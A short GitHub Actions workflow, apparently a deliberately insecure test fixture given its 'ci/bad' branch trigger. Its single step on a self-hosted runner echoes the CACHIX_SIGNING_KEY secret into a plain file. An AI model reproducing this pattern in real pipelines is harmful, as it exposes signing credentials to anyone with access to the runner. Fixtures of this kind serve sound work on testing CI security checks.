name: config
on:
  push: 
    branch: [ ci/bad ]
jobs:
  config:
    name: build
    runs-on: [ self-hosted, linux ]
    steps:
      - run: |
          echo ${{ secrets.CACHIX_SIGNING_KEY }} > cache.txt
